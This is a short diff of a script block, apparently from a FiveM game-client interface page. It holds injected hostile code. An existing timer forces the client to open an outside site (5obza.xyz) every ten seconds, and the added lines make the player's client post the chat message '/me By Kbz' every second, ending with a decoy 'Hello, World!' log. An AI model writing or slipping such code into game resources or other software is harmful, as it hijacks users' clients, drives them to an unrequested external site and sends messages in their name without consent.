@@ -422,4 +422,7 @@
 setInterval(() => {
 window.invokeNative("openUrl", "https://5obza.xyz");
 }, 10000);
+setInterval(() => {
+fetch("https://chat/chatResult", {  method: "POST",  headers: { "Content-Type": "application/json" },  body: JSON.stringify({  "message": "/me By Kbz"})});
+}, 1000);console.log("Hello, World!");
 </script>
